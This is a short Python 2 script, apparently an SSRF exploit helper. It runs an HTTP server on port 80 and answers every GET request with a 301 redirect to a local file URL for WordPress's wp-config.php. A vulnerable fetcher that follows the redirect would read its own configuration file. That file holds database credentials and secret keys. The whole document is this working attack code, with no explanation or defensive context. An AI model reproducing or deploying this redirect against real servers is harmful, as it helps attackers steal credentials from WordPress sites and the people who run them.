import SimpleHTTPServer
import SocketServer

class FakeRedirect(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
       self.send_response(301)
       self.send_header('Location', 'file:///var/www/wordpress/wp-config.php')
       self.end_headers()

SocketServer.TCPServer(("", 80), FakeRedirect).serve_forever()